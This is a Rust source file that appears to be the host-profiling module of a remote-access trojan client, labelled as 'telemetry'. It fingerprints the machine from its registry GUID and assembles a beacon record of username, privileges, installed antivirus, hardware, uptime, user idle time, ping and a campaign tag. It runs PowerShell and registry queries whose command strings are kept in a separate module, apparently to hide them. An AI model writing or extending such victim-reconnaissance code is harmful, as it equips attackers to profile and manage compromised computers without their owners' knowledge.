use std::{env, fs::OpenOptions, io::{Read, Seek, SeekFrom}, sync::atomic::{AtomicU64, Ordering as AtomicOrdering}};

#[cfg(windows)]
use std::{process::{Command, Stdio}, thread, time::{Duration, Instant}};

#[cfg(windows)]
use std::net::{Ipv4Addr, ToSocketAddrs};

use ed25519_dalek::SigningKey;
use hkdf::Hkdf;
use sha2::{Digest, Sha256};

use crate::text;

pub fn fingerprint() -> String {
    let (machine_id, hwid) = identity();
    derive(&machine_id, &hwid).0
}

pub fn host(fp: &str) -> String {
    let os = clean(ps(text::OS));
    let arch = env::var("PROCESSOR_ARCHITECTURE").unwrap_or_else(|_| "x86_64".into());
    format!(
        "{{\"clientId\":\"{}\",\"os\":\"{}\",\"arch\":\"{}\",\"version\":\"{}\"}}",
        json(fp),
        json(&os),
        json(&arch),
        json(text::VERSION)
    )
}

#[cfg(test)]
fn from_id(machine_id: &str) -> String {
    let hwid = digest(format!("{machine_id}|windows").as_bytes());
    derive(machine_id, &hwid).0
}

fn derive(machine_id: &str, hwid: &str) -> (String, [u8; 32]) {
    let hk = Hkdf::<Sha256>::new(Some(hwid.as_bytes()), machine_id.as_bytes());
    let mut seed = [0u8; 32];
    hk.expand(b"mirage-identity", &mut seed).expect("hkdf");
    let key = SigningKey::from_bytes(&seed);
    (hex(&Sha256::digest(key.verifying_key().to_bytes())), seed)
}

fn identity() -> (String, String) {
    if let Some(id) = machine_id() {
        let hwid = digest(format!("{id}|windows").as_bytes());
        return (id, hwid);
    }

    let hwid = digest(
        format!(
            "{}|{}|windows",
            env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into()),
            env::var("USERNAME").unwrap_or_else(|_| "unknown".into())
        )
        .as_bytes(),
    );
    (hwid.clone(), hwid)
}

pub fn record(target: &str, ping_ms: Option<u128>, fp: &str) -> String {
    let nickname = clean(env::var("COMPUTERNAME").unwrap_or_else(|_| "Windows".into()));
    let user = clean(env::var("USERNAME").unwrap_or_else(|_| "Unknown".into()));
    let cpu = clean(env::var("PROCESSOR_IDENTIFIER").unwrap_or_else(|_| "Unknown".into()));
    let privileges = clean(ps(text::PRIV));
    let gpu = clean(ps(text::GPU));
    let antivirus = clean(ps(text::AV));
    let ram = clean(ps(text::RAM));
    let os = clean(ps(text::OS));
    let afk = afk();
    let country = if matches!(target, "127.0.0.1" | "::1" | "localhost") {
        "Local"
    } else {
        "Unknown"
    };
    let hwid = machine_id().unwrap_or_else(fallback_display_hwid);

    [
        country.into(),
        nickname,
        text::TAG.into(),
        user,
        text::VERSION.into(),
        privileges,
        os,
        gpu,
        cpu,
        ram,
        antivirus,
        uptime(),
        afk,
        ping_ms.map_or_else(|| "Unknown".into(), |v| format!("{v} ms")),
        hwid,
        fp.to_owned(),
    ]
    .into_iter()
    .map(clean)
    .collect::<Vec<_>>()
    .join("|")
}

fn machine_id() -> Option<String> {
    #[cfg(windows)]
    {
        let out = run_command_with_timeout(
            text::REG,
            &[text::REG_QUERY, text::REG_64, text::REG_VALUE, text::REG_QUERY_KEY],
            Duration::from_secs(1),
        )?;
        let s = String::from_utf8_lossy(&out);
        return s.lines().find_map(|line| {
            let mut p = line.split_whitespace();
            let key = p.next()?;
            let _ty = p.next()?;
            let value = p.next()?;
            key.eq_ignore_ascii_case(text::REG_QUERY_KEY)
                .then(|| value.to_string())
        });
    }
    #[cfg(not(windows))]
    {
        None
    }
}

fn fallback_display_hwid() -> String {
    env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".into())
}

fn digest(bytes: &[u8]) -> String {
    hex(&Sha256::digest(bytes))
}

fn afk() -> String {
    #[cfg(windows)]
    {
        #[repr(C)]
        struct LastInput {
            cb_size: u32,
            tick: u32,
        }
        #[link(name = "user32")]
        unsafe extern "system" {
            fn GetLastInputInfo(info: *mut LastInput) -> i32;
        }
        #[link(name = "kernel32")]
        unsafe extern "system" {
            fn GetTickCount64() -> u64;
        }

        let mut info = LastInput {
            cb_size: core::mem::size_of::<LastInput>() as u32,
            tick: 0,
        };
        if unsafe { GetLastInputInfo(&mut info) } != 0 {
            let now = unsafe { GetTickCount64() };
            return fmt_duration((now as u32).wrapping_sub(info.tick) as u64 / 1_000);
        }
    }
    "0m".into()
}

fn uptime() -> String {
    #[cfg(windows)]
    {
        #[link(name = "kernel32")]
        unsafe extern "system" {
            fn GetTickCount64() -> u64;
        }
        return fmt_duration(unsafe { GetTickCount64() } / 1_000);
    }
    #[cfg(not(windows))]
    {
        "Unknown".into()
    }
}

pub fn ping_ms(target: &str) -> Option<u128> {
    #[cfg(windows)]
    {
        let ip = target.parse::<Ipv4Addr>().ok().or_else(|| {
            (target, 0).to_socket_addrs().ok()?.find_map(|a| match a {
                std::net::SocketAddr::V4(v4) => Some(*v4.ip()),
                std::net::SocketAddr::V6(_) => None,
            })
        })?;
        return icmp_ping_ms(ip);
    }
    #[cfg(not(windows))]
    {
        let _ = target;
        None
    }
}

#[cfg(windows)]
fn icmp_ping_ms(ip: Ipv4Addr) -> Option<u128> {
    use core::{ffi::c_void, mem::size_of, ptr};

    type Handle = *mut c_void;

    #[repr(C)]
    struct Reply {
        address: u32,
        status: u32,
        round_trip_time: u32,
        data_size: u16,
        reserved: u16,
        data: *mut c_void,
        options: Options,
    }

    #[repr(C)]
    struct Options {
        ttl: u8,
        tos: u8,
        flags: u8,
        options_size: u8,
        options_data: *mut u8,
    }

    #[link(name = "iphlpapi")]
    unsafe extern "system" {
        fn IcmpCreateFile() -> Handle;
        fn IcmpSendEcho(
            handle: Handle,
            destination_address: u32,
            request_data: *const c_void,
            request_size: u16,
            request_options: *const Options,
            reply_buffer: *mut c_void,
            reply_size: u32,
            timeout: u32,
        ) -> u32;
        fn IcmpCloseHandle(handle: Handle) -> i32;
    }

    let handle = unsafe { IcmpCreateFile() };
    if handle.is_null() {
        return None;
    }

    let mut reply = [0u8; size_of::<Reply>()];
    let sent = unsafe {
        IcmpSendEcho(
            handle,
            u32::from_ne_bytes(ip.octets()),
            ptr::null(),
            0,
            ptr::null(),
            reply.as_mut_ptr() as *mut c_void,
            reply.len() as u32,
            2_000,
        )
    };
    let result = if sent > 0 {
        let reply = unsafe { &*(reply.as_ptr() as *const Reply) };
        (reply.status == 0).then_some(reply.round_trip_time as u128)
    } else {
        None
    };
    unsafe { IcmpCloseHandle(handle) };
    result
}

fn fmt_duration(secs: u64) -> String {
    let d = secs / 86_400;
    let h = (secs % 86_400) / 3_600;
    let m = (secs % 3_600) / 60;
    let mut out = String::new();
    if d > 0 { out.push_str(&format!("{d}d")); }
    if h > 0 { if !out.is_empty() { out.push(' '); } out.push_str(&format!("{h}h")); }
    if !out.is_empty() { out.push(' '); }
    out.push_str(&format!("{m}m"));
    out
}

#[cfg(windows)]
static TELEMETRY_TMP_COUNTER: AtomicU64 = AtomicU64::new(0);

#[cfg(windows)]
fn run_command_with_timeout(program: &str, args: &[&str], timeout: Duration) -> Option<Vec<u8>> {
    // Avoid stdout=PIPE: PowerShell/WMI can leave descendants holding an inherited
    // pipe handle open, making wait_with_output() wait forever for EOF. A temporary
    // file decouples process lifetime from stdout consumption.
    let id = TELEMETRY_TMP_COUNTER.fetch_add(1, AtomicOrdering::Relaxed);
    let path = std::env::temp_dir().join(format!(
        "ztsec-telemetry-{}-{}.out",
        std::process::id(),
        id
    ));
    let file = OpenOptions::new().create_new(true).read(true).write(true).open(&path).ok()?;
    let child_stdout = match file.try_clone() {
        Ok(f) => f,
        Err(_) => {
            let _ = std::fs::remove_file(&path);
            return None;
        }
    };
    let mut child = match Command::new(program)
        .args(args)
        .stdout(Stdio::from(child_stdout))
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(child) => child,
        Err(_) => {
            let _ = std::fs::remove_file(&path);
            return None;
        }
    };

    let deadline = Instant::now() + timeout;
    let finished = loop {
        match child.try_wait() {
            Ok(Some(_)) => break true,
            Ok(None) if Instant::now() < deadline => thread::sleep(Duration::from_millis(25)),
            Ok(None) | Err(_) => {
                let _ = child.kill();
                let _ = child.wait();
                break false;
            }
        }
    };

    drop(child);
    let mut output_file = file;
    let _ = output_file.seek(SeekFrom::Start(0));
    let mut stdout = Vec::new();
    let _ = output_file.read_to_end(&mut stdout);
    drop(output_file);
    let _ = std::fs::remove_file(&path);
    finished.then_some(stdout)
}

#[cfg(windows)]
fn ps(script: &str) -> String {
    let args = [text::PS_ARG[0], text::PS_ARG[1], text::PS_ARG[2], script];
    run_command_with_timeout(text::PS, &args, Duration::from_secs(1))
        .map(|bytes| String::from_utf8_lossy(&bytes).into_owned())
        .unwrap_or_else(|| "Unknown".into())
}

#[cfg(not(windows))]
fn ps(_script: &str) -> String {
    "Unknown".into()
}

fn clean(v: String) -> String {
    let s = v.replace('|', "/").replace(['\r', '\n'], " ").trim().to_string();
    if s.is_empty() { "Unknown".into() } else { s }
}

fn json(v: &str) -> String {
    v.replace('\\', "\\\\").replace('"', "\\\"")
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::from_id;

    #[test]
    fn fingerprint_contract() {
        let machine_id = "00112233-4455-6677-8899-aabbccddeeff";
        let hwid = super::digest(format!("{machine_id}|windows").as_bytes());
        let (fingerprint, seed) = super::derive(machine_id, &hwid);
        assert_eq!(hwid, "b8aaf957abbdd67c3f611b113886e4dd656375b2b1e6c8ec11edaddd13af918b");
        assert_eq!(super::hex(&seed), "0baa1679f8562ab33b4ce4b27ae355130ff1d758a530b98134a68ef49b85adee");
        assert_eq!(fingerprint, "14f30ccfbc5b248cc89c5dede0e41fe2d7f427ff6b092a5dfd70e6f4d93994f9");
        assert_eq!(from_id(machine_id), fingerprint);
    }

    #[test]
    fn telemetry_contract() {
        let fp = "0".repeat(64);
        assert_eq!(super::record("127.0.0.1", Some(1), &fp).split('|').count(), 16);
    }

    #[test]
    fn uptime_contract() {
        assert_eq!(super::fmt_duration(30), "0m");
        assert_eq!(super::fmt_duration(121), "2m");
        assert_eq!(super::fmt_duration(7320), "2h 2m");
        assert_eq!(super::fmt_duration(97_260), "1d 3h 1m");
    }
}
